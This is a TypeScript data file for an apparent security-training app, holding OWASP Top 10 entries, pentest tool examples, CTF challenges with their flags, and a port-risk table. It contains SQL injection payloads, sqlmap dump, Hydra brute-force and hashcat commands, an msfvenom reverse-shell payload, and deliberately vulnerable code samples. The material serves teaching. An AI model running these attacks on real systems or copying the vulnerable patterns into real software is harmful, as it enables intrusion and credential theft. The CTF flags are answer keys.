export interface Vulnerability {
  id: string;
  code: string; // e.g. A01:2021
  title: string;
  category: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  cveExamples: string[];
  description: string;
  attackVector: string;
  vulnerableCode: string;
  secureCode: string;
  mitigation: string[];
}

export interface SecurityTool {
  id: string;
  name: string;
  category: 'Reconnaissance' | 'Vulnerability Analysis' | 'Exploitation' | 'Post-Exploitation' | 'Forensics' | 'Password Cracking';
  description: string;
  iconName: string;
  defaultCommand: string;
  examples: {
    title: string;
    command: string;
    explanation: string;
  }[];
}

export interface CTFChallenge {
  id: string;
  title: string;
  category: 'Web' | 'Crypto' | 'Recon' | 'Auth' | 'Forensics';
  difficulty: 'Beginner' | 'Intermediate' | 'Hard';
  points: number;
  description: string;
  hint: string;
  flag: string; // e.g. FLAG{...}
}

export const OWASP_TOP_10: Vulnerability[] = [
  {
    id: 'owasp-a01',
    code: 'A01:2021',
    title: 'Broken Access Control',
    category: 'Access Control',
    severity: 'Critical',
    cveExamples: ['CVE-2021-41773', 'CVE-2022-22965'],
    description: 'Flaws allowing authenticated users to act outside of their intended permissions, accessing unauthorized records or administrative endpoints.',
    attackVector: 'Modifying URLs, internal app states, or API parameters to view or edit another user account (IDOR).',
    vulnerableCode: `// VULNERABLE: Direct object reference without ownership check
app.get('/api/documents/:id', async (req, res) => {
  const doc = await db.query('SELECT * FROM docs WHERE id = ?', [req.params.id]);
  res.json(doc);
});`,
    secureCode: `// SECURE: Enforces user ownership and RBAC
app.get('/api/documents/:id', requireAuth, async (req, res) => {
  const doc = await db.query(
    'SELECT * FROM docs WHERE id = ? AND owner_id = ?',
    [req.params.id, req.user.id]
  );
  if (!doc) return res.status(403).json({ error: 'Unauthorized access' });
  res.json(doc);
});`,
    mitigation: [
      'Deny by default except for public resources.',
      'Implement Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC).',
      'Disable web server directory listing and ensure file metadata is not in web roots.',
      'Log access control failures and alert admins on repeated attempts.'
    ]
  },
  {
    id: 'owasp-a02',
    code: 'A02:2021',
    title: 'Cryptographic Failures',
    category: 'Cryptography',
    severity: 'High',
    cveExamples: ['CVE-2020-0601', 'CVE-2019-11510'],
    description: 'Exposures related to weak cryptographic algorithms, unencrypted sensitive data in transit or at rest, and poor key management.',
    attackVector: 'Intercepting plaintext HTTP traffic on public Wi-Fi, extracting weak MD5/SHA1 password hashes from database dumps.',
    vulnerableCode: `// VULNERABLE: Weak MD5 hashing without salt
const crypto = require('crypto');
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}`,
    secureCode: `// SECURE: Modern Argon2id or bcrypt with adaptive work factor
const bcrypt = require('bcrypt');
async function hashPassword(password) {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
}`,
    mitigation: [
      'Classify data processed, stored, or transmitted by an app and identify sensitive data.',
      'Enforce TLS 1.3 with strong cipher suites and HSTS (Strict-Transport-Security).',
      'Do not use legacy cryptographic functions like MD5, SHA-1, RC4, or DES.',
      'Store passwords using strong salted and adaptive hash functions (bcrypt, scrypt, Argon2).'
    ]
  },
  {
    id: 'owasp-a03',
    code: 'A03:2021',
    title: 'Injection (SQL, NoSQL, OS Command)',
    category: 'Input Validation',
    severity: 'Critical',
    cveExamples: ['CVE-2017-5638 (Equifax)', 'CVE-2021-44228 (Log4Shell)'],
    description: 'User-supplied data is not validated, filtered, or sanitized by the application, allowing an attacker to execute unintended commands or queries.',
    attackVector: "Passing malicious payloads such as `admin' --` or `1' OR '1'='1` into inputs concatenated into query strings.",
    vulnerableCode: `// VULNERABLE: Direct string interpolation into SQL query
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND password = '" + req.body.password + "'";
db.execute(query);`,
    secureCode: `// SECURE: Parameterized query (Prepared Statement)
const query = 'SELECT id, email, password_hash FROM users WHERE email = ?';
db.execute(query, [req.body.email]);`,
    mitigation: [
      'Use parameterized queries (prepared statements) with ORMs or raw database drivers.',
      'Apply positive (allowlist) input validation on all server-side inputs.',
      'For OS command calls, use APIs that avoid shell spawning (e.g. execFile instead of exec).',
      'Enforce database least privilege (web user cannot DROP tables or read sys tables).'
    ]
  },
  {
    id: 'owasp-a04',
    code: 'A04:2021',
    title: 'Insecure Design',
    category: 'Architecture',
    severity: 'High',
    cveExamples: ['CVE-2020-13935'],
    description: 'Focuses on risks related to design and architectural flaws. You cannot patch or configure away a missing design requirement.',
    attackVector: 'Exploiting business logic gaps, such as lack of rate-limiting on password resets or unrestricted file purchases.',
    vulnerableCode: `// VULNERABLE: Unlimited password reset attempts without lockout or rate limit
app.post('/api/reset-password', async (req, res) => {
  await sendResetEmail(req.body.email);
  res.json({ success: true });
});`,
    secureCode: `// SECURE: Rate-limited endpoint with CAPTCHA and anti-enumeration response
const rateLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 3 });
app.post('/api/reset-password', rateLimiter, async (req, res) => {
  await safeInitiatePasswordReset(req.body.email);
  // Generic response prevents account enumeration
  res.json({ message: 'If this email exists, a reset link has been dispatched.' });
});`,
    mitigation: [
      'Integrate threat modeling (STRIDE) during architecture design phases.',
      'Implement defense-in-depth and fail-secure mechanisms.',
      'Unit and integration tests to verify all business logic constraints.',
      'Limit resource consumption per user/tenant.'
    ]
  },
  {
    id: 'owasp-a05',
    code: 'A05:2021',
    title: 'Security Misconfiguration',
    category: 'Infrastructure',
    severity: 'High',
    cveExamples: ['CVE-2019-11581', 'CVE-2021-26084'],
    description: 'Missing security hardening across application stack, default credentials, verbose error traces disclosing stack details, or open cloud buckets.',
    attackVector: 'Accessing unauthenticated diagnostic dashboards, default /admin credentials, or reading full stack traces with database connection strings.',
    vulnerableCode: `// VULNERABLE: Detailed stack traces leaked to client in production
app.use((err, req, res, next) => {
  res.status(500).json({
    message: err.message,
    stack: err.stack,
    sql: err.sql
  });
});`,
    secureCode: `// SECURE: Masked errors to client; logged internally with secure logging
app.use((err, req, res, next) => {
  logger.error(err);
  res.status(500).json({ error: 'An unexpected internal error occurred. Incident ID: ' + req.id });
});`,
    mitigation: [
      'Automate hardened server templates and CIS benchmark checks.',
      'Disable unnecessary features, ports, services, and default admin accounts.',
      'Send explicit security headers (CSP, X-Frame-Options, HSTS, Referrer-Policy).',
      'Conduct regular automated configuration audits.'
    ]
  },
  {
    id: 'owasp-a07',
    code: 'A07:2021',
    title: 'Identification and Authentication Failures',
    category: 'Authentication',
    severity: 'High',
    cveExamples: ['CVE-2021-34527', 'CVE-2022-26134'],
    description: 'Confirmation of the user identity, authentication, and session management flaws enabling credential stuffing, brute force, or session hijacking.',
    attackVector: 'Brute-forcing weak 4-digit MFA tokens, credential stuffing using leaked password databases, or predictable session tokens.',
    vulnerableCode: `// VULNERABLE: Weak session tokens and no brute-force prevention
app.post('/login', (req, res) => {
  if (user && user.password === req.body.password) {
    res.cookie('session', user.id); // Predictable, un-signed, no HttpOnly/Secure flags
    return res.send('Logged in');
  }
});`,
    secureCode: `// SECURE: HttpOnly, Secure, SameSite cookies with cryptographically strong tokens
app.post('/login', loginLimiter, async (req, res) => {
  const isValid = await verifyPassword(req.body.password, user.hash);
  if (isValid) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('token', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 3600000
    });
  }
});`,
    mitigation: [
      'Implement multi-factor authentication (MFA) to prevent automated credential stuffing.',
      'Do not ship or deploy with default credentials.',
      'Enforce minimum password length and check against HaveIBeenPwned breaches.',
      'Regenerate session IDs upon successful authentication.'
    ]
  }
];

export const PENTEST_TOOLS: SecurityTool[] = [
  {
    id: 'nmap',
    name: 'Nmap (Network Mapper)',
    category: 'Reconnaissance',
    description: 'The industry-standard open source utility for network discovery, port scanning, and vulnerability detection.',
    iconName: 'Radar',
    defaultCommand: 'nmap -sV -sC -T4 target.com',
    examples: [
      {
        title: 'Fast Top 100 Port Scan',
        command: 'nmap -F 192.168.1.1',
        explanation: 'Scans the top 100 most common ports quickly to establish an initial attack surface.'
      },
      {
        title: 'Service Version & Default Scripts',
        command: 'nmap -sV -sC -O -p- 10.10.10.5',
        explanation: 'Scans all 65,535 ports, probes open ports for service version info, OS detection, and runs safe NSE scripts.'
      },
      {
        title: 'Vulnerability Detection Script',
        command: 'nmap --script vuln 192.168.1.100',
        explanation: 'Executes standard Nmap Scripting Engine (NSE) vulnerability checks for known CVEs.'
      }
    ]
  },
  {
    id: 'sqlmap',
    name: 'SQLmap',
    category: 'Exploitation',
    description: 'Automatic SQL injection and database takeover tool capable of exploiting Boolean, Error, Union, Time, and Stacked queries.',
    iconName: 'Database',
    defaultCommand: 'sqlmap -u "http://target.com/page?id=1" --dbs',
    examples: [
      {
        title: 'Enumerate Databases',
        command: 'sqlmap -u "https://site.com/item.php?id=1" --dbs --batch',
        explanation: 'Tests URL parameter id for SQLi and enumerates database names automatically without prompting.'
      },
      {
        title: 'Dump Table Records',
        command: 'sqlmap -u "https://site.com/item.php?id=1" -D app_db -T users --dump',
        explanation: 'Extracts all columns and rows from the users table in the app_db database.'
      },
      {
        title: 'POST Request Testing with Form Data',
        command: 'sqlmap -u "https://site.com/login" --data="user=admin&pass=test" -p user',
        explanation: 'Directly tests the "user" POST parameter for SQL injection vulnerabilities.'
      }
    ]
  },
  {
    id: 'gobuster',
    name: 'Gobuster / Feroxbuster',
    category: 'Reconnaissance',
    description: 'High-speed directory, file, and DNS subdomain bruteforcing utility written in Go.',
    iconName: 'FolderSearch',
    defaultCommand: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt',
    examples: [
      {
        title: 'Hidden Directory Bruteforce',
        command: 'gobuster dir -u http://target.com -w common.txt -x php,html,txt,json',
        explanation: 'Finds hidden files and endpoints matching specific extensions like config.php or backup.sql.'
      },
      {
        title: 'DNS Subdomain Discovery',
        command: 'gobuster dns -d target.com -w subdomains-top1mil-5000.txt',
        explanation: 'Discovers active subdomains (e.g. dev.target.com, api.target.com) using dictionary lookups.'
      }
    ]
  },
  {
    id: 'hydra',
    name: 'THC-Hydra',
    category: 'Password Cracking',
    description: 'Extremely fast network logon cracker supporting SSH, FTP, HTTP-POST, RDP, MySQL, SMB, and 50+ protocols.',
    iconName: 'KeyRound',
    defaultCommand: 'hydra -l admin -P rockyou.txt ssh://192.168.1.50',
    examples: [
      {
        title: 'SSH Brute Force',
        command: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.20 -t 4',
        explanation: 'Attempts logins against SSH port 22 with username root using 4 parallel threads.'
      },
      {
        title: 'HTTP POST Form Authentication',
        command: 'hydra 10.10.10.20 http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid password"',
        explanation: 'Brute-forces a web login page detecting failures when "invalid password" is in the response.'
      }
    ]
  },
  {
    id: 'john',
    name: 'John the Ripper / Hashcat',
    category: 'Password Cracking',
    description: 'High-performance offline password hash cracking suite supporting GPU acceleration and rule-based wordlists.',
    iconName: 'Cpu',
    defaultCommand: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt',
    examples: [
      {
        title: 'Crack MD5 Hashes with Hashcat',
        command: 'hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
        explanation: 'Cracks unsalted MD5 hashes (-m 0) using straight dictionary attack (-a 0).'
      },
      {
        title: 'Crack SHA-256 Hashes',
        command: 'hashcat -m 1400 -a 0 hashes.txt rockyou.txt -r rules/best64.rule',
        explanation: 'Cracks SHA-256 with wordlist permutations (capitalization, leetspeak, numbers appended).'
      }
    ]
  },
  {
    id: 'metasploit',
    name: 'Metasploit Framework',
    category: 'Exploitation',
    description: 'The premier open penetration testing platform providing verified exploit code, payloads, and post-exploitation modules.',
    iconName: 'Crosshair',
    defaultCommand: 'msfconsole -q',
    examples: [
      {
        title: 'Search & Launch Exploit',
        command: 'use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.10.10.5; exploit',
        explanation: 'Loads Apache Path Traversal / RCE module, sets target host, and executes exploit payload.'
      },
      {
        title: 'Generate Reverse Shell Payload',
        command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf',
        explanation: 'Creates a compiled Linux executable payload that connects back to attacker listener.'
      }
    ]
  }
];

export const CTF_CHALLENGES: CTFChallenge[] = [
  {
    id: 'ctf-1',
    title: 'Mission 01: The Unprotected Backup',
    category: 'Recon',
    difficulty: 'Beginner',
    points: 100,
    description: 'A misconfigured web developer left secrets hidden in HTML comments and robots.txt. Can you inspect the simulated page response to locate the secret token?',
    hint: 'Check HTML source comments or sensitive directory paths like /.git, /admin, or /backup.zip.',
    flag: 'FLAG{recon_d0m_c0mm3nts_exp0s3d}'
  },
  {
    id: 'ctf-2',
    title: 'Mission 02: Cryptic Obfuscation',
    category: 'Crypto',
    difficulty: 'Beginner',
    points: 150,
    description: 'Intercepted transmission: "RkxBR3tiNHNlNjRfZDNjMGQzZF9tNDN0M3J9" encoded in standard RFC 4648 Base64 format.',
    hint: 'Use a standard Base64 decoder to reveal the plaintext ASCII flag.',
    flag: 'FLAG{b4se64_d3c0d3d_m43t3r}'
  },
  {
    id: 'ctf-3',
    title: 'Mission 03: SQL Authentication Bypass',
    category: 'Auth',
    difficulty: 'Intermediate',
    points: 200,
    description: 'A legacy login form computes: SELECT * FROM members WHERE user = \'{INPUT}\' AND pass = \'{PASS}\'. Bypass authentication without knowing the password.',
    hint: "Think about classic SQL comment characters and tautologies: admin' OR '1'='1' --",
    flag: 'FLAG{sqli_auth_byp4ss_succ3ssful}'
  },
  {
    id: 'ctf-4',
    title: 'Mission 04: The Weak Hash Collision',
    category: 'Crypto',
    difficulty: 'Intermediate',
    points: 250,
    description: 'An admin user password was dumped as MD5: "e10adc3949ba59abbe56e057f20f883e". What was the original password? The flag format is FLAG{<password>}.',
    hint: 'This is the most famous 6-digit sequential PIN hash in history: 123456.',
    flag: 'FLAG{123456}'
  },
  {
    id: 'ctf-5',
    title: 'Mission 05: JWT "None" Algorithm Exploitation',
    category: 'Web',
    difficulty: 'Hard',
    points: 350,
    description: 'A microservice blindly trusts JWT tokens where {"alg": "none"}. Change the role claim from "guest" to "superadmin" with an empty signature.',
    hint: 'Headers: {"alg":"none","typ":"JWT"}. Payload: {"role":"superadmin","user":"hacker"}. No signature required.',
    flag: 'FLAG{jwt_alg_n0n3_crit1cal_fl4w}'
  }
];

export const COMMON_PORTS = [
  { port: 21, service: 'FTP', transport: 'TCP', risk: 'High', description: 'Cleartext file transfer, prone to anonymous login and credential sniffing.' },
  { port: 22, service: 'SSH', transport: 'TCP', risk: 'Medium', description: 'Secure Shell. Vulnerable to weak passwords, outdated OpenSSH CVEs.' },
  { port: 23, service: 'Telnet', transport: 'TCP', risk: 'Critical', description: 'Unencrypted remote shell; transmits passwords in cleartext.' },
  { port: 25, service: 'SMTP', transport: 'TCP', risk: 'Medium', description: 'Mail transfer protocol; can expose open mail relays and user enumeration.' },
  { port: 53, service: 'DNS', transport: 'UDP/TCP', risk: 'Medium', description: 'Domain Name System; susceptible to cache poisoning and zone transfers (AXFR).' },
  { port: 80, service: 'HTTP', transport: 'TCP', risk: 'High', description: 'Unencrypted web traffic; subject to Man-in-the-Middle (MitM) attacks.' },
  { port: 443, service: 'HTTPS', transport: 'TCP', risk: 'Low', description: 'Encrypted HTTP via TLS. Watch for certificate validity and weak cipher suites.' },
  { port: 445, service: 'SMB', transport: 'TCP', risk: 'Critical', description: 'Windows file sharing. Historically targeted by EternalBlue (MS17-010).' },
  { port: 1433, service: 'MSSQL', transport: 'TCP', risk: 'High', description: 'Microsoft SQL Server; targeted for SA brute force and xp_cmdshell execution.' },
  { port: 3306, service: 'MySQL', transport: 'TCP', risk: 'High', description: 'MySQL Database. Should never be exposed directly to the public internet.' },
  { port: 3389, service: 'RDP', transport: 'TCP', risk: 'High', description: 'Remote Desktop Protocol. Target for BlueKeep (CVE-2019-0708) and brute force.' },
  { port: 6379, service: 'Redis', transport: 'TCP', risk: 'Critical', description: 'In-memory store. Frequently left open without password, allowing instant RCE.' }
];
